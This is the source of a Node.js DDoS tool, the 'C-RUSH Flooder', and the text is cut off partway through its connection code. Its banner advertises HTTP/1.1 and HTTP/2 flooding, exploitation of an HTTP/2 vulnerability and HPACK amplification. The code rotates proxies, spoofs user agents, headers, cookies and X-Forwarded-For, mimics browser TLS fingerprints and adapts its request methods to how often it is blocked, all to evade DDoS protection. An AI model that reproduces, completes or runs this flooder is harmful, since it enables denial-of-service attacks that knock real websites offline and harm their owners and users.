const http2 = require('http2');
const http = require('http');
const net = require('net');
const fs = require('fs');
const colors = require('colors');
const setTitle = require('node-bash-title');
const cluster = require('cluster');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto'); // Import crypto module for stronger randomness

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'DeprecationWarning'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT', 'DEP0123'];

const versions = {
    Safari: ['15.0', '15.1', '15.2', '15.3', '15.4', '15.5', '15.6', '16.0', '16.1', '16.2', '16.3', '16.4', '16.5', '16.6', '16.7', '17.0', '17.1', '17.2', '17.3', '17.4', '17.5'],
    Chrome: ['90.0.4430.212', '91.0.4472.106', '92.0.4515.107', '93.0.4577.63', '94.0.4606.61', '95.0.4638.54', '96.0.4664.45', '97.0.4692.71', '98.0.4758.81', '99.0.4844.51', '100.0.4896.60', '101.0.4951.41', '102.0.5005.61', '103.0.5060.53', '104.0.5112.79', '105.0.5195.52', '106.0.5249.61', '107.0.5304.62', '108.0.5359.71', '109.0.5414.74', '110.0.5481.77', '111.0.5563.64', '112.0.5615.49', '113.0.5672.63', '114.0.5735.110', '115.0.5790.171', '116.0.5845.96', '117.0.5938.88', '118.0.5993.70', '119.0.6045.105', '120.0.6099.109'],
    Firefox: ['88.0', '89.0', '90.0', '91.0', '92.0', '93.0', '94.0', '95.0', '96.0', '97.0', '98.0', '99.0', '100.0', '101.0', '102.0', '103.0', '104.0', '105.0', '106.0', '107.0', '108.0', '109.0', '110.0', '111.0', '112.0', '113.0', '114.0', '115.0', '116.0', '117.0', '118.0', '119.0', '120.0'],
    Edge: ['90.0.818.41', '91.0.864.37', '92.0.902.55', '93.0.961.38', '94.0.992.31', '95.0.1020.30', '96.0.1054.29', '97.0.1072.62', '98.0.1108.43', '99.0.1150.30', '100.0.1185.29', '101.0.1210.32', '102.0.1245.33', '103.0.1264.37', '104.0.1293.41', '105.0.1343.25', '106.0.1370.47', '107.0.1418.42', '108.0.1462.46', '109.0.1518.52', '110.0.1587.40', '111.0.1661.41', '112.0.1722.34', '113.0.1774.35', '114.0.1823.51', '115.0.1901.183', '116.0.1938.62', '117.0.2045.31', '118.0.2088.46', '119.0.2151.72', '120.0.2210.155']
};

// Helper functions for generating various types of cookie values
function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function generateRandomHex(length) {
    let result = '';
    const characters = '0123456789abcdef';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomAlphaNumeric(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateBase64(length) {
    const bytes = crypto.randomBytes(Math.ceil(length * 3 / 4));
    return bytes.toString('base64').substring(0, length);
}

// Advanced cookie generation logic
function generateAdvancedCookie() {
    const cookieTypes = [
        'session_id',
        'tracking_ga',
        'tracking_fb',
        'csrf_token',
        'preference',
        'generic_random'
    ];

    const type = cookieTypes[Math.floor(Math.random() * cookieTypes.length)];
    let name, value;

    switch (type) {
        case 'session_id':
            const sessionNames = ['JSESSIONID', 'PHPSESSID', 'ASPSESSIONID', 'sessionid', 'connect.sid', '_session_id', 'sess', 'user_session'];
            name = sessionNames[Math.floor(Math.random() * sessionNames.length)];
            if (Math.random() < 0.5) {
                value = generateRandomHex(Math.floor(Math.random() * (40 - 20 + 1)) + 20); // 20-40 hex chars
            } else {
                value = generateUUID();
            }
            break;
        case 'tracking_ga':
            name = `_ga`;
            value = `GA1.${Math.floor(Math.random() * 9) + 1}.${Math.floor(Math.random() * 9000000000) + 1000000000}.${Date.now() - Math.floor(Math.random() * 31536000000)}`;
            break;
        case 'tracking_fb':
            name = `_fbp`;
            value = `fb.1.${Date.now() - Math.floor(Math.random() * 31536000000)}.${Math.floor(Math.random() * 900000000000) + 100000000000}`; // 12-digit random number
            break;
        case 'csrf_token':
            const csrfNames = ['csrftoken', 'XSRF-TOKEN', '__Host-csrf', '__Secure-csrf', 'csrf'];
            name = csrfNames[Math.floor(Math.random() * csrfNames.length)];
            value = generateBase64(Math.floor(Math.random() * (32 - 16 + 1)) + 16); // 16-32 base64 chars
            break;
        case 'preference':
            const prefNames = ['pref', 'theme', 'lang', 'currency', 'timezone', 'country', 'settings'];
            name = prefNames[Math.floor(Math.random() * prefNames.length)];
            const prefValues = {
                'theme': ['dark', 'light', 'system', 'auto'],
                'lang': ['en', 'fa', 'ar', 'de', 'fr', 'es', 'pt', 'ru', 'zh'],
                'currency': ['USD', 'EUR', 'GBP', 'IRR', 'JPY', 'CAD'],
                'timezone': ['America/New_York', 'Europe/Berlin', 'Asia/Tehran', 'UTC', 'Asia/Tokyo', 'America/Los_Angeles'],
                'country': ['US', 'DE', 'IR', 'GB', 'FR', 'JP', 'CA', 'AU']
            };
            value = prefValues[name] ? prefValues[name][Math.floor(Math.random() * prefValues[name].length)] : generateRandomAlphaNumeric(Math.floor(Math.random() * (10 - 5 + 1)) + 5);
            break;
        case 'generic_random':
        default:
            const genericNames = ['id', 'token', 'data', 'key', 'user_id', 'client_id', 'visitor_id', 'guid'];
            name = genericNames[Math.floor(Math.random() * genericNames.length)];
            value = generateRandomAlphaNumeric(Math.floor(Math.random() * (20 - 10 + 1)) + 10); // 10-20 alphanumeric chars
            break;
    }
    return `${name}=${value}`;
}


const args = process.argv.slice(2);
const options = {
    cookies: args.includes('-c'),
    headfull: args.includes('-h'),
    version: args.includes('-v') ? args[args.indexOf('-v') + 1] : '2',
    cache: args.includes('-ch') ? args[args.indexOf('-ch') + 1] === 'true' : true,
    debug: !args.includes('-s'),
    h2ConcurrentStreams: args.includes('--h2-streams') ? parseInt(args[args.indexOf('--h2-streams') + 1]) : 50
};

const referrers = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yahoo.com/',
    'https://t.co/',
    'https://facebook.com/',
    'https://linkedin.com/',
    'https://www.reddit.com/',
    'https://www.duckduckgo.com/',
    'https://search.aol.com/',
    'https://www.baidu.com/',
    'https://www.yandex.com/',
    'https://www.ecosia.org/',
    'https://www.amazon.com/',
    'https://www.youtube.com/',
    'https://www.wikipedia.org/',
    'https://www.instagram.com/',
    'https://www.tiktok.com/',
    'https://www.pinterest.com/',
    'https://www.twitch.tv/',
    'https://www.ebay.com/',
    'https://www.cnn.com/',
    'https://www.bbc.com/',
    'https://www.quora.com/',
    'https://www.stackoverflow.com/',
    'https://www.github.com/',
    'https://www.netflix.com/',
    'https://www.spotify.com/',
    'https://www.dropbox.com/',
    'https://www.medium.com/',
    'https://www.aliexpress.com/',
    'https://www.forbes.com/',
    'https://www.zillow.com/'
];

const dntOptions = ['1', '0']; // Do Not Track
const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'application/json, text/javascript, */*; q=0.01'
];
const acceptLanguageHeaders = [
    'en-US,en;q=0.9,fa;q=0.8',
    'en-US,en;q=0.9',
    'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-GB,en;q=0.9',
    'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
    'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7'
];
const acceptEncodingHeaders = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate',
    'gzip',
    'deflate',
    'identity'
];

// User-Agent pool - massively diversified
const userAgentPool = [
    // iPhone User-Agents (Safari, Chrome, Firefox, Edge on iOS)
    ...versions.Safari.map(v => `Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${v} Mobile/15E148 Safari/604.1`),
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.109 Mobile/15E148 Safari/604.1`, // Chrome on iOS
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/120.0 Mobile/15E148 Safari/604.1`, // Firefox on iOS
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/120.0.2210.155 Mobile/15E148 Safari/604.1`, // Edge on iOS

    // Android User-Agents (Chrome, Firefox, Samsung Browser)
    ...versions.Chrome.map(v => `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v} Mobile Safari/537.36`),
    ...versions.Firefox.map(v => `Mozilla/5.0 (Android 10; Mobile; rv:${v}) Gecko/${v} Firefox/${v}`),
    `Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36`,

    // Desktop Chrome (Windows, macOS, Linux)
    ...versions.Chrome.map(v => `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v} Safari/537.36`),
    ...versions.Chrome.map(v => `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v} Safari/537.36`),
    ...versions.Chrome.map(v => `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v} Safari/537.36`),

    // Desktop Firefox (Windows, macOS, Linux)
    ...versions.Firefox.map(v => `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${v}.0) Gecko/20100101 Firefox/${v}.0`),
    ...versions.Firefox.map(v => `Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:${v}.0) Gecko/20100101 Firefox/${v}.0`),
    ...versions.Firefox.map(v => `Mozilla/5.0 (X11; Linux x86_64; rv:${v}.0) Gecko/20100101 Firefox/${v}.0`),

    // Desktop Edge (Windows)
    ...versions.Edge.map(v => `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/${v}`),

    // Desktop Safari (macOS)
    ...versions.Safari.map(v => `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${v} Safari/605.1.15`)
];


function generateUserAgent() {
    const ua = userAgentPool[Math.floor(Math.random() * userAgentPool.length)];
    // Attempt to parse device and browser for more specific header generation if needed.
    // Simplified for now, as the primary goal is diverse UAs.
    return { ua, device: 'random', browser: 'random' };
}

// Global variable to store response status counts for adaptive behavior
const responseStatusCounts = {};
// Global variable for dynamic method weighting based on perceived blocks
const methodWeights = {
    'GET': 0.7,
    'HEAD': 0.3,
    'POST': 0.0,
    'PUT': 0.0,
    'DELETE': 0.0
};
let lastAdaptationTime = Date.now();
const ADAPTATION_INTERVAL = 10 * 1000; // Adapt every 10 seconds - faster reaction!

function updateMethodWeights() {
    const totalRequests = responseStatusCounts['total'] || 1; // Avoid division by zero
    // Expanded block detection to include 403, 401, 400, 429, 503, and generic errors.
    const blockedRequests = (responseStatusCounts['403'] || 0) +
                            (responseStatusCounts['401'] || 0) +
                            (responseStatusCounts['400'] || 0) +
                            (responseStatusCounts['429'] || 0) +
                            (responseStatusCounts['503'] || 0) +
                            (responseStatusCounts['error'] || 0); // Include generic errors as potential blocks
    const blockPercentage = (blockedRequests / totalRequests) * 100;

    if (options.debug) console.log(colors.magenta(`[ADAPTIVE] Block Percentage: ${blockPercentage.toFixed(2)}%`));

    // More aggressive adaptation: if block percentage is high, drastically reduce 'risky' methods
    if (blockPercentage > 15) { // If more than 15% are blocked
        methodWeights['POST'] = Math.max(0, methodWeights['POST'] - 0.1);
        methodWeights['PUT'] = Math.max(0, methodWeights['PUT'] - 0.1);
        methodWeights['DELETE'] = Math.max(0, methodWeights['DELETE'] - 0.05);

        const remainingWeight = 1 - (methodWeights['POST'] + methodWeights['PUT'] + methodWeights['DELETE']);
        methodWeights['GET'] = remainingWeight * 0.75; // Favor GET even more
        methodWeights['HEAD'] = remainingWeight * 0.25;

        if (options.debug) console.log(colors.yellow(`[ADAPTIVE] Increased GET/HEAD due to HIGH blocks. New weights: ${JSON.stringify(methodWeights)}`));
    } else if (blockPercentage < 5) { // If blocks are low, gently increase 'risky' methods for variety
        methodWeights['POST'] = Math.min(0.2, methodWeights['POST'] + 0.02);
        methodWeights['PUT'] = Math.min(0.1, methodWeights['PUT'] + 0.01);
        methodWeights['DELETE'] = Math.min(0.05, methodWeights['DELETE'] + 0.005);

        // Ensure sum doesn't exceed 1 and re-distribute GET/HEAD
        const currentSum = methodWeights['GET'] + methodWeights['HEAD'] + methodWeights['POST'] + methodWeights['PUT'] + methodWeights['DELETE'];
        if (currentSum > 1) {
            const factor = 1 / currentSum;
            for (const method in methodWeights) {
                methodWeights[method] *= factor;
            }
        }
        if (options.debug) console.log(colors.green(`[ADAPTIVE] Decreased GET/HEAD slightly. New weights: ${JSON.stringify(methodWeights)}`));
    } else { // Moderate blocks, maintain balance or slightly adjust
        methodWeights['POST'] = Math.max(0, methodWeights['POST'] - 0.01);
        methodWeights['PUT'] = Math.max(0, methodWeights['PUT'] - 0.01);
        methodWeights['DELETE'] = Math.max(0, methodWeights['DELETE'] - 0.005);
        const remainingWeight = 1 - (methodWeights['POST'] + methodWeights['PUT'] + methodWeights['DELETE']);
        methodWeights['GET'] = remainingWeight * 0.7;
        methodWeights['HEAD'] = remainingWeight * 0.3;
        if (options.debug) console.log(colors.blue(`[ADAPTIVE] Moderate blocks, subtle adjustment. New weights: ${JSON.stringify(methodWeights)}`));
    }

    // Clear counts for the next interval
    for (const key in responseStatusCounts) {
        delete responseStatusCounts[key];
    }
}

// Common paths to diversify requests
const commonPaths = [
    '/',
    '/products',
    '/blog',
    '/about',
    '/contact',
    '/login',
    '/register',
    '/support',
    '/faq',
    '/terms',
    '/privacy',
    '/api/data', // Example API endpoint
    '/search?q=test', // Example search query
    '/category/electronics',
    '/item/12345'
];

function generateDynamicPath(baseUrl) {
    const path = commonPaths[Math.floor(Math.random() * commonPaths.length)];
    // Add random query parameters to further diversify and cache bust
    const hasQueryParams = path.includes('?');
    const separator = hasQueryParams ? '&' : '?';
    const randomParam = `_=${Date.now()}${Math.floor(Math.random() * 1000)}`; // Cache busting
    const additionalParam = Math.random() < 0.3 ? `&session_id=${generateRandomHex(8)}` : ''; // More realistic params

    return `${path}${separator}${randomParam}${additionalParam}`;
}


function generateDynamicHeaders(currentHost, uaDetails) {
    const headers = {};
    const allReferrers = [...referrers];
    if (currentHost) {
        allReferrers.push(`https://${currentHost}/`);
        allReferrers.push(`https://${currentHost}/blog/`);
        allReferrers.push(`https://${currentHost}/products/`);
        allReferrers.push(`https://${currentHost}/about/`);
        allReferrers.push(`https://${currentHost}/contact/`);
        allReferrers.push(`https://${currentHost}/help/`);
        allReferrers.push(`https://${currentHost}/faq/`);
        allReferrers.push(`https://${currentHost}/careers/`);
        allReferrers.push(`https://${currentHost}/news/`);
        allReferrers.push(`https://${currentHost}/press/`);
    }

    // Dynamic Referer based on perceived block or random inclusion
    if (Math.random() < 0.8 || (responseStatusCounts['403'] > (responseStatusCounts['total'] * 0.05))) {
        headers['Referer'] = allReferrers[Math.floor(Math.random() * allReferrers.length)];
    }

    if (Math.random() < 0.5) {
        headers['DNT'] = dntOptions[Math.floor(Math.random() * dntOptions.length)];
    }
    headers['Accept'] = acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)];
    headers['Accept-Language'] = acceptLanguageHeaders[Math.floor(Math.random() * acceptLanguageHeaders.length)];
    headers['Accept-Encoding'] = acceptEncodingHeaders[Math.floor(Math.random() * acceptEncodingHeaders.length)];

    // Introduce more realistic browser-specific headers (Client Hints and others)
    const browser = uaDetails.browser || 'Chrome'; // Default if parsing fails
    const device = uaDetails.device || 'desktop'; // Default if parsing fails

    if (browser === 'Chrome' || browser === 'Edge') {
        headers['Sec-CH-UA'] = `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`; // Example
        headers['Sec-CH-UA-Mobile'] = device === 'mobile' ? '?1' : '?0';
        headers['Sec-CH-UA-Platform'] = device === 'mobile' ? `"Android"` : `"Windows"`; // Or "macOS", "Linux"
        if (Math.random() < 0.5) { // Add full version and architecture for more realism
            headers['Sec-CH-UA-Full-Version-List'] = `"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.109", "Google Chrome";v="120.0.6099.109"`;
            headers['Sec-CH-UA-Arch'] = Math.random() < 0.5 ? `"x86"` : `"arm"`;
            headers['Sec-CH-UA-Model'] = device === 'mobile' ? `"Pixel 6"` : `""`; // Example for mobile
            headers['Sec-CH-UA-WoW64'] = Math.random() < 0.5 ? `?0` : `?1`;
        }
    } else if (browser === 'Safari') {
        headers['Sec-Fetch-Site'] = ['same-origin', 'cross-site', 'none'][Math.floor(Math.random() * 3)];
        headers['Sec-Fetch-Mode'] = ['navigate', 'no-cors', 'cors'][Math.floor(Math.random() * 3)];
        headers['Sec-Fetch-Dest'] = ['document', 'empty', 'image'][Math.floor(Math.random() * 3)];
        headers['Sec-Fetch-User'] = '?1';
        headers['Upgrade-Insecure-Requests'] = '1';
    }

    if (Math.random() < 0.3) { // Varying inclusion of X-Requested-With
        headers['X-Requested-With'] = 'XMLHttpRequest';
    }

    if (Math.random() < 0.1) {
        headers['X-Forwarded-For'] = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    if (Math.random() < 0.05) { // Varying content types for realism, even for GET
        headers['Content-Type'] = ['application/x-www-form-urlencoded', 'text/plain'][Math.floor(Math.random() * 2)];
    }
    if (Math.random() < 0.05) { // Add If-Modified-Since to mimic caching behavior
        const daysAgo = Math.floor(Math.random() * 30); // 0-30 days ago
        const date = new Date(Date.now() - daysAgo * 24 * 60 * 60 * 1000);
        headers['If-Modified-Since'] = date.toUTCString();
    }
    if (Math.random() < 0.05) { // Add If-None-Match to mimic caching behavior
        headers['If-None-Match'] = `"${generateRandomHex(16)}"`;
    }
    if (Math.random() < 0.1) { // Add some privacy headers
        headers['Sec-GPC'] = '1'; // Global Privacy Control
    }

    // Randomize header order for HTTP/2. For HTTP/1.1, order is typically fixed.
    const headerKeys = Object.keys(headers);
    if (options.version === '2') {
        // Simple shuffle
        for (let i = headerKeys.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [headerKeys[i], headerKeys[j]] = [headerKeys[j], headerKeys[i]];
        }
    }

    const orderedHeaders = {};
    for (const key of headerKeys) {
        orderedHeaders[key] = headers[key];
    }

    return orderedHeaders;
}

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

process
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

if (process.argv.length < 7) {
    console.clear();
    console.log(colors.red(`
    ${colors.green(``)} C-RUSH Flooder - HTTP/1.1 & HTTP/2 Mixed RushAway
        ${colors.gray(`Made with 筅�ｸ by NIKKI (${colors.red(`@`)}getflood)`)}

    ${colors.gray(`Features${colors.red(`:`)}
    - Implements HTTP/2 multiplexing with custom stream prioritization
    - Exploits RushAway vulnerability in HTTP/2 implementations
    - Utilizes HPACK header compression for amplification
    - Flooding with mixed HTTP/1.1 & HTTP/2 (GET + POST + HEAD + PUT + DELETE)
    - Features proxy rotation and connection pooling
    - Advanced Fingerprinting: Massively diversified User-Agents (Desktop, Mobile, various browsers), Randomized & Realistic Headers for better bypass.
    - DDoS Bypass: Intelligent connection cycling on errors to maintain attack rate.
    - Enhanced Cookie Generation: Realistic and varied cookie names/values for better evasion.
    - Optimized HTTP Methods: Adaptive prioritization of GET/HEAD based on target response.
    - AI-like Adaptive Module: Dynamically adjusts headers and methods based on block rates (HTTP-DDoS rules), with faster adaptation.
    - Path Diversification: Mimics realistic Browse by requesting various paths on the target.
    `)}

    ${colors.gray(`Usage${colors.red(`:`)}`)}
    ${colors.gray(`node c-rush.js <target> <duration> <proxies.txt> <threads> <rate> [options]`)}

    ${colors.gray(`Options${colors.red(`:`)}`)}
    ${colors.gray(`-c: Enable random cookies`)}
    ${colors.gray(`-h: Enable headfull requests (mobile-optimized)`)}
    ${colors.gray(`-v <1/2>: Choose HTTP version (1 or 2)`)}
    ${colors.gray(`-ch <true/false>: Enable/disable cache`)}
    ${colors.gray(`-s: Disable debug output`)}
    ${colors.gray(`--h2-streams <count>: Number of concurrent HTTP/2 streams per connection (default: ${options.h2ConcurrentStreams})`)}

    ${colors.gray(`Example${colors.red(`:`)}`)}
    ${colors.gray(`node c-rush.js https://target.com 120 proxies.txt 100 64 --h2-streams 100`)}
    `));
    process.exit(1);
}

const target = process.argv[2];
const duration = process.argv[3];
const proxyFile = process.argv[4];
const threads = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);

let proxies = [];
let proxy = [];

try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(p => p.length > 0);
    proxy = proxies;
} catch (e) {
    if(options.debug) console.log(colors.red('圻 Error loading proxy file'));
    process.exit(1);
}

let stats = {
    requests: 0,
    goaway: 0,
    success: 0,
    forbidden: 0,
    errors: 0
}

let statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const url = new URL(target);

const connectionPool = {};

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

function chooseMethod() {
    const methods = Object.keys(methodWeights);
    let cumulativeWeight = 0;
    const r = Math.random();
    for (const method of methods) {
        cumulativeWeight += methodWeights[method];
        if (r < cumulativeWeight) {
            return method;
        }
    }
    return 'GET'; // Fallback
}


function buildRequest() {
    const method = chooseMethod();
    const uaDetails = generateUserAgent(); // Get both UA string and parsed details
    const dynamicHeaders = generateDynamicHeaders(url.hostname, uaDetails);
    const dynamicPath = generateDynamicPath(url.pathname);

    let headers = `${method} ${dynamicPath} HTTP/1.1\r\n` +
        `Host: ${url.hostname}\r\n`;

    // Ensure User-Agent is always present
    headers += `User-Agent: ${uaDetails.ua}\r\n`;

    for (const headerName in dynamicHeaders) {
        // Avoid duplicating User-Agent if already added by generateDynamicHeaders
        if (headerName.toLowerCase() === 'user-agent') continue;
        headers += `${headerName}: ${dynamicHeaders[headerName]}\r\n`;
    }

    headers += `Cache-Control: ${options.cache ? 'max-age=0' : 'no-cache'}\r\n` +
        'Connection: Keep-Alive\r\n'; // Explicitly keep alive for HTTP/1.1

    if (options.cookies) {
        headers += `Cookie: ${generateAdvancedCookie()}; ${generateAdvancedCookie()}\r\n`;
    }

    let requestBody = '';
    if (method === 'POST' || method === 'PUT') {
        const payloadData = generateRandomAlphaNumeric(Math.floor(Math.random() * (50 - 10 + 1)) + 10); // Varying payload length
        const payloadType = Math.random() < 0.5 ? 'json' : 'form';

        if (payloadType === 'json') {
            requestBody = JSON.stringify({ id: generateUUID(), data: payloadData, timestamp: Date.now() });
            headers += `Content-Type: application/json\r\n`;
        } else {
            requestBody = `param1=${encodeURIComponent(payloadData)}&param2=${generateRandomAlphaNumeric(5)}`;
            headers += `Content-Type: application/x-www-form-urlencoded\r\n`;
        }
        headers += `Content-Length: ${Buffer.byteLength(requestBody)}\r\n`;
    }

    headers += '\r\n'; // End of headers

    return Buffer.from(headers + requestBody, 'binary');
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

function go() {
    const selectedProxy = proxy[~~(Math.random() * proxy.length)];
    const [proxyHost, proxyPort] = selectedProxy.split(':');

    if (!proxyPort || isNaN(proxyPort)) {
        if (options.debug) console.log(colors.yellow(`Skipping invalid proxy: ${selectedProxy}`));
        stats.errors++;
        return;
    }

    let tlsSocket;

    if (connectionPool[selectedProxy] && connectionPool[selectedProxy].length > 0) {
        tlsSocket = connectionPool[selectedProxy].shift();
        if (!tlsSocket.destroyed && !tlsSocket._pending) {
            if (options.debug) console.log(colors.blue(`Reusing connection for ${selectedProxy}`));
            // Check if connection is still valid (e.g., by sending a PING frame for H2)
            if (tlsSocket.alpnProtocol === 'h2') {
                tlsSocket.write(encodeFrame(0, 6, Buffer.from(crypto.randomBytes(8)))); // HTTP/2 PING frame
            }
            if (tlsSocket.alpnProtocol === 'http/1.1' || options.version === '1') {
                doWriteHttp1(tlsSocket, selectedProxy);
            } else if (tlsSocket.alpnProtocol === 'h2') {
                doWriteHttp2(tlsSocket, selectedProxy);
            }
            return;
        } else {
            if (options.debug) console.log(colors.yellow(`Discarding stale/destroyed connection from pool for ${selectedProxy}`));
        }
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => { // Wait for proxy CONNECT response
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: options.version === '1' ? ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                // TLS Fingerprinting Evasion: Common ciphers and curves
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                // Mimic modern browser TLS options
